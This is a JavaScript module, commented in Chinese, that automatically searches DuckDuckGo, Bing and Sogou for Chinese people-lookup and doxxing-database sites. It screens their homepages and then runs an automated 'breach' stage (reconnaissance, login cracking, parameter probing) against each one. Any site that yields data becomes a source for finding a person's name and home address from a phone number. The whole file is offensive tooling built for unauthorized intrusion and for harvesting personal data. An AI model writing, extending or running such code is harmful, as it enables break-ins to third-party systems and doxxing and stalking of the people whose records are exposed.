'use strict';

/**
 * 自动发现可用的查档源 —— 用户不需要提供任何网址。
 *
 * 流程：多引擎搜索（DuckDuckGo / Bing / 搜狗）→ 从结果页抠候选域名
 *      → 过滤掉搜索引擎与大型平台 → 逐个自动攻破（侦察/破登录/试参数）
 *      → 真能出数据的（特征命中达标）自动接入为数据源。
 *
 * 后台任务方式跑，start() 返回 jobId，status() 轮询。
 */

const config = require('./config');
const recon = require('./recon');
const connect = require('./connect');
const breach = require('./breach');

const UA = (config.userAgent) ||
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36';

// 搜索词：覆盖"手机号查地址""身份证查住址""查档""社工库"等常见说法
const QUERIES = [
  '手机号 查询 姓名 户籍地址',
  '身份证号 查询 详细住址',
  '手机号 查 快递收货地址 在线查询',
  '户籍查询 在线 身份证 姓名',
  '查档 个人信息 查询 手机号',
  '手机号 实名认证 查询 姓名 地址',
  '身份证 查 常住地址 街道',
  '社工库 在线查询 手机号',
  '手机号 归属 实名 查询',
  '身份信息查询 姓名 电话 地址',
];

// 这些域名不可能是查档站，直接跳过
const SKIP_HOST = /(\.|^)(baidu|google|bing|duckduckgo|sogou|so\.com|yahoo|zhihu|weibo|taobao|tmall|jd|pdd|qq|163|sina|sohu|csdn|bilibili|youtube|youku|github|gitlab|stackoverflow|wikipedia|zhidao|wenda|tieba|douban|xhs|xiaohongshu|gov|mil|edu)\./i;

// 搜索引擎：返回 {url, parse} —— parse 从 HTML 里抠出真实目标 URL
const ENGINES = [
  {
    name: 'duckduckgo',
    build: (q, page) => 'https://html.duckduckgo.com/html/?q=' + encodeURIComponent(q) + (page ? '&s=' + (page * 30) : ''),
  },
  {
    name: 'bing',
    build: (q, page) => 'https://www.bing.com/search?q=' + encodeURIComponent(q) + '&count=30' + (page ? '&first=' + (page * 30 + 1) : ''),
  },
  {
    name: 'sogou',
    build: (q, page) => 'https://www.sogou.com/web?query=' + encodeURIComponent(q) + (page ? '&page=' + (page + 1) : ''),
  },
];

// ---------- 任务存储 ----------
const jobs = new Map();
let seq = 0;

function newJob() {
  const id = 'd' + (++seq) + '_' + Date.now();
  const job = { id, done: false, stopped: false, steps: [], result: null, error: null, startedAt: Date.now() };
  jobs.set(id, job);
  return job;
}

function log(job, stage, msg, level) {
  job.steps.push({ t: Date.now(), stage, msg: String(msg), level: level || 'info' });
  if (job.steps.length > 800) job.steps.splice(0, 200);
}

async function withTimeout(promise, ms) {
  return new Promise((resolve, reject) => {
    const t = setTimeout(() => reject(new Error('timeout')), ms);
    promise.then(resolve, reject).finally(() => clearTimeout(t));
  });
}

function hostOf(u) {
  try { return new URL(u).hostname.replace(/^www\./, '').toLowerCase(); } catch (e) { return ''; }
}

// 从搜索结果页 HTML 里抠出目标 URL（含 DuckDuckGo 的 uddg 跳转还原）
function extractUrls(html) {
  const out = new Set();
  const src = String(html || '');

  // DuckDuckGo 的跳转：/l/?uddg=https%3A%2F%2F...
  const uddg = /uddg=([^&"']+)/gi;
  let m;
  while ((m = uddg.exec(src))) {
    try {
      const real = decodeURIComponent(m[1]);
      if (/^https?:\/\//i.test(real)) out.add(real);
    } catch (e) { /* ignore */ }
  }

  // 普通 <a href="http...">
  const href = /href=["'](https?:\/\/[^"'>\s]{6,300})["']/gi;
  while ((m = href.exec(src))) {
    try { out.add(m[1]); } catch (e) { /* ignore */ }
  }
  return [...out];
}

// ---------- 1. 搜索拿候选域名 ----------
async function searchCandidates(job, opts) {
  const queries = (opts.queries && opts.queries.length) ? opts.queries : QUERIES;
  const engines = (opts.engines && opts.engines.length)
    ? ENGINES.filter((e) => opts.engines.includes(e.name))
    : ENGINES;
  const maxPerQuery = parseInt(opts.maxPerQuery || 30, 10);

  const found = new Map(); // host -> {url, via:[], queries:[]}

  for (const eng of engines) {
    if (job.stopped) break;
    let engOk = false;
    for (const q of queries) {
      if (job.stopped) break;
      const url = eng.build(q, 0);
      let html = '';
      try {
        const r = await withTimeout(fetch(url, {
          method: 'GET',
          headers: { 'User-Agent': UA, 'Accept-Language': 'zh-CN,zh;q=0.9', Accept: 'text/html,*/*' },
          redirect: 'follow',
        }), 15000);
        if (!r.ok) { continue; }
        html = await r.text();
        engOk = true;
      } catch (e) {
        continue;
      }
      let n = 0;
      for (const u of extractUrls(html).slice(0, maxPerQuery)) {
        const h = hostOf(u);
        if (!h || SKIP_HOST.test(h)) continue;
        if (h.includes(eng.name)) continue;
        if (!found.has(h)) {
          found.set(h, { host: h, url: 'https://' + h, via: [eng.name], queries: [q] });
          n++;
        } else {
          const rec = found.get(h);
          if (!rec.via.includes(eng.name)) rec.via.push(eng.name);
          if (!rec.queries.includes(q)) rec.queries.push(q);
        }
      }
      if (n) log(job, '① 搜索', eng.name + '「' + q + '」→ 新增 ' + n + ' 个候选（累计 ' + found.size + '）');
    }
    if (!engOk) log(job, '① 搜索', eng.name + ' 不可用（可能被墙或需要代理）', 'warn');
  }

  return [...found.values()];
}

// ---------- 2. 快筛：先花 1 个请求看看这个站值不值得深打 ----------
async function quickScreen(item, timeout) {
  try {
    const r = await breach.directCall({
      url: item.url, method: 'GET', timeout: timeout || 8000,
      headers: { 'User-Agent': UA, Accept: 'text/html,*/*' },
    });
    if (!r || r.status !== 200) return { ok: false, reason: 'HTTP ' + (r && r.status) };
    const t = String(r.body || '');
    // 查档站首页通常会出现这些词
    const hit = /查询|查档|户籍|身份|实名|手机号|身份证|社工|个人信息|地址|住址/.test(t);
    return { ok: hit, reason: hit ? '首页像查档站' : '首页不像查档站', size: t.length, title: (t.match(/<title[^>]*>([^<]{1,80})/i) || [])[1] || '' };
  } catch (e) {
    return { ok: false, reason: e.message };
  }
}

async function mapLimit(items, limit, fn) {
  const out = [];
  let i = 0;
  const workers = [];
  for (let w = 0; w < Math.min(limit, items.length); w++) {
    workers.push((async () => {
      while (i < items.length) {
        const idx = i++;
        try { out[idx] = await fn(items[idx], idx); } catch (e) { out[idx] = { error: e.message }; }
      }
    })());
  }
  await Promise.all(workers);
  return out;
}

// ---------- 编排 ----------
async function run(job, opts) {
  const o = opts || {};
  try {
    const maxProbe = parseInt(o.maxProbe || 10, 10);
    const maxOk = parseInt(o.maxOk || 3, 10);
    const job2 = job;
    const scheme = o.scheme === 'http' ? 'http' : 'https';

    // ① 搜索（也可直接用 o.hosts 喂候选，跳过搜索）
    let cands;
    if (o.hosts && o.hosts.length) {
      cands = o.hosts.map((h) => {
        const host = String(h).replace(/^https?:\/\//i, '').replace(/^www\./, '').replace(/\/.*$/, '').toLowerCase();
        return { host, url: scheme + '://' + host, via: ['手动'], queries: [] };
      });
      log(job, '① 候选', '使用指定的 ' + cands.length + ' 个域名（跳过搜索）');
    } else {
      log(job, '① 搜索', '开始多引擎搜索候选站点…');
      cands = await searchCandidates(job, o);
      log(job, '① 搜索', '共 ' + cands.length + ' 个候选域名');
    }
    if (job.stopped) return finish(job);
    if (!cands.length) {
      log(job, '① 搜索', '一个候选都没搜到 —— 搜索引擎全部不可达。需要代理：点上面「自动检测系统代理」。', 'warn');
      return finish(job);
    }

    // ② 快筛
    log(job, '② 快筛', '并发探测首页，筛出像查档站的…');
    const screened = await mapLimit(cands.slice(0, Math.max(maxProbe * 3, 20)), 6, async (c) => {
      if (job2.stopped) return Object.assign({}, c, { screen: { ok: false, reason: '已停止' } });
      const s = await quickScreen(c, 8000);
      return Object.assign({}, c, { screen: s });
    });
    const good = screened.filter((c) => c && c.screen && c.screen.ok);
    log(job, '② 快筛', good.length + ' / ' + screened.length + ' 个首页像查档站');
    good.slice(0, 10).forEach((c) => log(job, '② 快筛', '  ' + c.host + ' — ' + (c.screen.title || c.screen.reason), 'hit'));
    if (job.stopped) return finish(job);

    // ③ 逐个自动攻破
    const order = good.length ? good : screened.filter((c) => c && !(c.screen || {}).reason) || [];
    const probeList = (order.length ? order : screened).slice(0, maxProbe);
    log(job, '③ 攻破', '对 ' + probeList.length + ' 个站点自动攻破（侦察→破登录→试参数）…');

    const okList = [];
    const tried = [];
    for (const c of probeList) {
      if (job.stopped) break;
      if (okList.length >= maxOk) break;
      log(job, '③ 攻破', c.host);
      try {
        const r = await connect.connect({
          url: c.url,
          subdomains: false,
          doBreach: o.doBreach !== false,
          usernames: o.usernames,
          passwords: o.passwords,
          apis: o.apis,
        }, (stage, msg, level) => log(job, '③ 攻破·' + c.host, msg, level));

        tried.push({ host: c.host, ok: !!r.target, target: r.target ? r.target.name : null, apis: (r.apis || []).length, warning: r.warning || null });
        if (r.target) {
          okList.push({ host: c.host, name: r.target.name, url: r.target.url, body: r.target.body, apis: r.apis || [] });
          log(job, '③ 攻破', '★ ' + c.host + ' 接入成功（' + r.target.body + '）', 'hit');
        } else {
          log(job, '③ 攻破', c.host + ' 没找到可用接口' + (r.warning ? '：' + r.warning : ''), 'warn');
        }
      } catch (e) {
        tried.push({ host: c.host, ok: false, error: e.message });
        log(job, '③ 攻破', c.host + ' 失败：' + e.message, 'warn');
      }
    }

    job.result = { candidates: cands.length, screened: screened.length, good: good.length, connected: okList, tried, targets: (config.targets || []).filter((t) => t && t.enabled) };
    log(job, '完成', '候选 ' + cands.length + ' → 像查档站 ' + good.length +
      ' → 成功接入 ' + okList.length + ' 个。现在顶部输手机号即可查询。');
    if (!okList.length) {
      log(job, '完成', '这次没接到任何源。可以再点一次（换一批搜索结果），或在「接入一个查档站」里手动粘网址。', 'warn');
    }
    return finish(job);
  } catch (e) {
    job.error = e.message;
    log(job, '异常', e.message, 'warn');
    return finish(job);
  }
}

function finish(job) {
  job.done = true;
  job.finishedAt = Date.now();
  return job;
}

function start(opts) {
  const job = newJob();
  run(job, opts || {});
  return job.id;
}

function status(id) {
  const job = jobs.get(id);
  if (!job) return null;
  return { id: job.id, done: job.done, stopped: job.stopped, error: job.error, steps: job.steps.slice(-400), ms: Date.now() - job.startedAt, result: job.result };
}

function stop(id) {
  const job = jobs.get(id);
  if (!job) return false;
  job.stopped = true;
  return true;
}

module.exports = { start, status, stop, searchCandidates, extractUrls, quickScreen, QUERIES, hostOf };
